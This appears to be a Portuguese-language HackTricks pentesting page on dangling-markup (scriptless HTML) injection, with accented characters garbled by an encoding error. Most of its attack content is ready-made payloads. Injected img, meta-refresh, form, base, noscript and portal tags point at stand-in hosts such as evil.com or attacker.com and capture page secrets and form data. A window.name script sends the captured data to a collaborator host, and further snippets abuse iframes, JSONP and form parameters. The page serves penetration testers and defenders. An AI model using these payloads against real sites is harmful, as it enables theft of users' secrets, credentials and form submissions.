# Dangling Markup - InjeÃ§Ã£o HTML sem script

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- VocÃª trabalha em uma **empresa de seguranÃ§a cibernÃ©tica**? VocÃª quer ver sua **empresa anunciada no HackTricks**? ou vocÃª quer ter acesso Ã  **Ãºltima versÃ£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A FamÃ­lia PEASS**](https://opensea.io/collection/the-peass-family), nossa coleÃ§Ã£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe suas tÃ©cnicas de hacking enviando PRs para o [repositÃ³rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Resumo

Esta tÃ©cnica pode ser usada para extrair informaÃ§Ãµes de um usuÃ¡rio quando uma **injeÃ§Ã£o HTML Ã© encontrada**. Isso Ã© muito Ãºtil se vocÃª **nÃ£o encontrar nenhuma maneira de explorar um** [**XSS** ](xss-cross-site-scripting/) mas vocÃª pode **injetar algumas tags HTML**.\
TambÃ©m Ã© Ãºtil se algum **segredo Ã© salvo em texto claro** no HTML e vocÃª deseja **exfiltrÃ¡-lo do cliente**, ou se vocÃª deseja enganar a execuÃ§Ã£o de algum script.

VÃ¡rias tÃ©cnicas comentadas aqui podem ser usadas para contornar algumas [**PolÃ­ticas de SeguranÃ§a de ConteÃºdo**](content-security-policy-csp-bypass/) exfiltrando informaÃ§Ãµes de maneiras inesperadas (tags html, CSS, http-meta tags, formulÃ¡rios, base...).

## Principais AplicaÃ§Ãµes

### Roubo de segredos em texto claro

Se vocÃª injetar `<img src='http://evil.com/log.cgi?` quando a pÃ¡gina for carregada, a vÃ­tima enviarÃ¡ para vocÃª todo o cÃ³digo entre a tag `img` injetada e a prÃ³xima aspa dentro do cÃ³digo. Se um segredo estiver localizado de alguma forma nesse trecho, vocÃª o roubarÃ¡ (vocÃª pode fazer a mesma coisa usando uma aspa dupla, veja qual pode ser mais interessante de usar).

Se a tag `img` for proibida (devido a CSP, por exemplo), vocÃª tambÃ©m pode usar `<meta http-equiv="refresh" content="4; URL='http://evil.com/log.cgi?`
```
<img src='http://attacker.com/log.php?HTML=
<meta http-equiv="refresh" content='0; url=http://evil.com/log.php?text=
<meta http-equiv="refresh" content='0;URL=ftp://evil.com?a=
```
Observe que o **Chrome bloqueia URLs HTTP** com "<" ou "\n", entÃ£o vocÃª pode tentar outros esquemas de protocolo como "ftp".

VocÃª tambÃ©m pode abusar do `@import` do CSS (enviarÃ¡ todo o cÃ³digo atÃ© encontrar um ";").
```markup
<style>@import//hackvertor.co.uk?     <--- Injected
<b>steal me!</b>;
```
VocÃª tambÃ©m pode usar **`<table`**:
```bash
<table background='//your-collaborator-id.burpcollaborator.net?'
```
VocÃª tambÃ©m pode inserir uma tag `<base>`. Todas as informaÃ§Ãµes serÃ£o enviadas atÃ© que a citaÃ§Ã£o seja fechada, mas isso requer alguma interaÃ§Ã£o do usuÃ¡rio (o usuÃ¡rio deve clicar em algum link, porque a tag base terÃ¡ alterado o domÃ­nio apontado pelo link):
```markup
<base target='        <--- Injected
steal me'<b>test</b>
```
### Roubo de formulÃ¡rios
```markup
<base href='http://evil.com/'>
```
EntÃ£o, os formulÃ¡rios que enviam dados para um caminho (como `<form action='update_profile.php'>`) enviarÃ£o os dados para o domÃ­nio malicioso.

### Roubo de formulÃ¡rios 2

Defina um cabeÃ§alho de formulÃ¡rio: `<form action='http://evil.com/log_steal'>` isso sobrescreverÃ¡ o prÃ³ximo cabeÃ§alho do formulÃ¡rio e todos os dados do formulÃ¡rio serÃ£o enviados para o atacante.

### Roubo de formulÃ¡rios 3

O botÃ£o pode alterar o URL para onde as informaÃ§Ãµes do formulÃ¡rio serÃ£o enviadas com o atributo "formaction":
```markup
<button name=xss type=submit formaction='https://google.com'>I get consumed!
```
Um atacante pode usar isso para roubar informaÃ§Ãµes.

### Roubo de segredos em texto claro 2

Usando a tÃ©cnica mencionada anteriormente para roubar formulÃ¡rios (injetando um novo cabeÃ§alho de formulÃ¡rio), vocÃª pode entÃ£o injetar um novo campo de entrada:
```markup
<input type='hidden' name='review_body' value="
```
e este campo de entrada conterÃ¡ todo o conteÃºdo entre suas aspas duplas e as prÃ³ximas aspas duplas no HTML. Este ataque mistura "_**Roubo de segredos de texto claro**_" com "_**Roubo de formulÃ¡rios2**_".

VocÃª pode fazer a mesma coisa injetando um formulÃ¡rio e uma tag `<option>`. Todos os dados atÃ© que um `</option>` fechado seja encontrado serÃ£o enviados:
```markup
<form action=http://google.com><input type="submit">Click Me</input><select name=xss><option
```
### InjeÃ§Ã£o de parÃ¢metro de formulÃ¡rio

VocÃª pode alterar o caminho de um formulÃ¡rio e inserir novos valores para que uma aÃ§Ã£o inesperada seja executada:
```markup
<form action='/change_settings.php'>
<input type='hidden' name='invite_user' 
  value='fredmbogo'>                                        â† Injected lines

<form action="/change_settings.php">                        â† Existing form (ignored by the parser)
...
<input type="text" name="invite_user" value="">             â† Subverted field
...
<input type="hidden" name="xsrf_token" value="12345">
...
</form>
```
### Roubo de segredos em texto claro via noscript

`<noscript></noscript>` Ã© uma tag cujo conteÃºdo serÃ¡ interpretado se o navegador nÃ£o suportar javascript (vocÃª pode habilitar/desabilitar o Javascript no Chrome em [chrome://settings/content/javascript](chrome://settings/content/javascript)).

Uma maneira de exfiltrar o conteÃºdo da pÃ¡gina da web do ponto de injeÃ§Ã£o atÃ© o final para um site controlado pelo atacante serÃ¡ injetando isso:
```markup
<noscript><form action=http://evil.com><input type=submit style="position:absolute;left:0;top:0;width:100%;height:100%;" type=submit value=""><textarea name=contents></noscript>
```
### Bypassando CSP com interaÃ§Ã£o do usuÃ¡rio

A partir desta pesquisa da [PortSwiggers](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup), Ã© possÃ­vel aprender que mesmo nos ambientes **mais restritos pelo CSP**, ainda Ã© possÃ­vel **extrair dados** com alguma **interaÃ§Ã£o do usuÃ¡rio**. Nesta ocasiÃ£o, vamos usar o payload:
```markup
<a href=http://attacker.net/payload.html><font size=100 color=red>You must click me</font></a>
<base target='
```
Observe que vocÃª pedirÃ¡ Ã  **vÃ­tima** que **clique em um link** que o redirecionarÃ¡ para um **payload** controlado por vocÃª. Observe tambÃ©m que o atributo **`target`** dentro da tag **`base`** conterÃ¡ **conteÃºdo HTML** atÃ© a prÃ³xima aspa simples.\
Isso farÃ¡ com que o **valor** de **`window.name`** seja todo esse **conteÃºdo HTML** quando o link for clicado. Portanto, como vocÃª **controla a pÃ¡gina** onde a vÃ­tima estÃ¡ acessando ao clicar no link, vocÃª pode acessar esse **`window.name`** e **extrair** esses dados:
```markup
<script>
if(window.name) {
    new Image().src='//your-collaborator-id.burpcollaborator.net?'+encodeURIComponent(window.name);
</script>
```
### Fluxo de script enganoso 1 - Ataque de namespace HTML

Insira uma nova tag com um id dentro do HTML que irÃ¡ sobrescrever a prÃ³xima e com um valor que afetarÃ¡ o fluxo de um script. Neste exemplo, vocÃª estÃ¡ selecionando com quem uma informaÃ§Ã£o serÃ¡ compartilhada:
```markup
<input type='hidden' id='share_with' value='fredmbogo'>     â† Injected markup
...
Share this status update with:                              â† Legitimate optional element of a dialog
<input id='share_with' value=''>

...

function submit_status_update() {
  ...
  request.share_with = document.getElementById('share_with').value;
  ...
}
```
### Fluxo de script enganoso 2 - Ataque de namespace de script

Crie variÃ¡veis dentro do namespace do javascript inserindo tags HTML. Em seguida, essa variÃ¡vel afetarÃ¡ o fluxo da aplicaÃ§Ã£o:
```markup
<img id='is_public'>                                        â† Injected markup

...

// Legitimate application code follows

function retrieve_acls() {
  ...
  if (response.access_mode == AM_PUBLIC)                    â† The subsequent assignment fails in IE
    is_public = true;
  else
    is_public = false;
}

function submit_new_acls() {
  ...
  if (is_public) request.access_mode = AM_PUBLIC;           â† Condition always evaluates to true
  ...
}
```
### Abuso de JSONP

Se vocÃª encontrar uma interface JSONP, poderÃ¡ chamar uma funÃ§Ã£o arbitrÃ¡ria com dados arbitrÃ¡rios:
```markup
<script src='/editor/sharing.js'>:              â† Legitimate script
  function set_sharing(public) {
    if (public) request.access_mode = AM_PUBLIC;
      else request.access_mode = AM_PRIVATE;
    ...
  }

<script src='/search?q=a&call=set_sharing'>:    â† Injected JSONP call
  set_sharing({ ... })
```
Ou vocÃª pode tentar executar algum javascript:
```markup
<script src='/search?q=a&call=alert(1)'></script>
```
### Abuso de Iframe

Observe que um **documento filho pode visualizar e definir a propriedade de localizaÃ§Ã£o do pai, mesmo que seja de origem cruzada.** Isso significa que vocÃª pode fazer com que o cliente acesse qualquer outra pÃ¡gina carregando dentro de um **iframe** algum cÃ³digo como:
```markup
<html><head></head><body><script>top.window.location = "https://attacker.com/hacked.html"</script></body></html>
```
Isso pode ser mitigado com algo como: _**sandbox=â€™ allow-scripts allow-top-navigationâ€™**_

Um iframe tambÃ©m pode ser explorado para vazar informaÃ§Ãµes sensÃ­veis de uma pÃ¡gina diferente **usando o atributo de nome do iframe**. Isso ocorre porque vocÃª pode criar um iframe que se auto-iframe abusando da injeÃ§Ã£o de HTML que faz com que as **informaÃ§Ãµes sensÃ­veis apareÃ§am dentro do atributo de nome do iframe** e, em seguida, acessar esse nome do iframe inicial e vazÃ¡-lo.
```html
<script>
    function cspBypass(win) {
        win[0].location = 'about:blank';
        setTimeout(()=>alert(win[0].name), 500); 
    }
</script>

<iframe src="//subdomain1.portswigger-labs.net/bypassing-csp-with-dangling-iframes/target.php?email=%22><iframe name=%27" onload="cspBypass(this.contentWindow)"></iframe>
```
Para mais informaÃ§Ãµes, consulte [https://portswigger.net/research/bypassing-csp-with-dangling-iframes](https://portswigger.net/research/bypassing-csp-with-dangling-iframes)

### Abuso de \<meta

VocÃª pode usar **`meta http-equiv`** para realizar **vÃ¡rias aÃ§Ãµes** como definir um Cookie: `<meta http-equiv="Set-Cookie" Content="SESSID=1">` ou realizar um redirecionamento (em 5s neste caso): `<meta name="language" content="5;http://attacker.svg" HTTP-EQUIV="refresh" />`

Isso pode ser **evitado** com um **CSP** em relaÃ§Ã£o ao **http-equiv** (`Content-Security-Policy: default-src 'self';`, ou `Content-Security-Policy: http-equiv 'self';`)

### Novo tag HTML \<portal>

VocÃª pode encontrar uma pesquisa muito **interessante** sobre vulnerabilidades explorÃ¡veis da tag \<portal> [aqui](https://research.securitum.com/security-analysis-of-portal-element/).\
No momento em que este texto foi escrito, vocÃª precisa habilitar a tag portal no Chrome em `chrome://flags/#enable-portals` ou ela nÃ£o funcionarÃ¡.
```markup
<portal src='https://attacker-server?
```
### Vazamentos de HTML

 Nem todas as maneiras de vazar conectividade em HTML serÃ£o Ãºteis para o Dangling Markup, mas Ã s vezes pode ajudar. Verifique aqui: [https://github.com/cure53/HTTPLeaks/blob/master/leak.html](https://github.com/cure53/HTTPLeaks/blob/master/leak.html)

## XS-Search

XS-Search Ã© orientado para **exfiltrar informaÃ§Ãµes de origem cruzada** abusando de **ataques de canal lateral**. Portanto, Ã© uma tÃ©cnica diferente do Dangling Markup, no entanto, algumas das tÃ©cnicas abusam da inclusÃ£o de tags HTML (com e sem execuÃ§Ã£o JS), como [**InjeÃ§Ã£o de CSS**](xs-search.md#css-injection) ou [**Carregamento Lento de Imagens**](xs-search.md#image-lazy-loading)**.**

{% content-ref url="xs-search.md" %}
[xs-search.md](xs-search.md)
{% endcontent-ref %}

## Lista de DetecÃ§Ã£o de ForÃ§a Bruta

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/dangling_markup.txt" %}

## ReferÃªncias

Todas as tÃ©cnicas apresentadas aqui e mais podem ser revisadas com mais detalhes em:

{% embed url="http://lcamtuf.coredump.cx/postxss/" %}

Outras tags HTML que podem ser abusadas podem ser encontradas aqui:

{% embed url="http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/" %}

Mais informaÃ§Ãµes:

{% embed url="https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- VocÃª trabalha em uma **empresa de seguranÃ§a cibernÃ©tica**? VocÃª quer ver sua **empresa anunciada no HackTricks**? ou vocÃª quer ter acesso Ã  **Ãºltima versÃ£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A FamÃ­lia PEASS**](https://opensea.io/collection/the-peass-family), nossa coleÃ§Ã£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me no** **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe suas tÃ©cnicas de hacking enviando PRs para o [repositÃ³rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
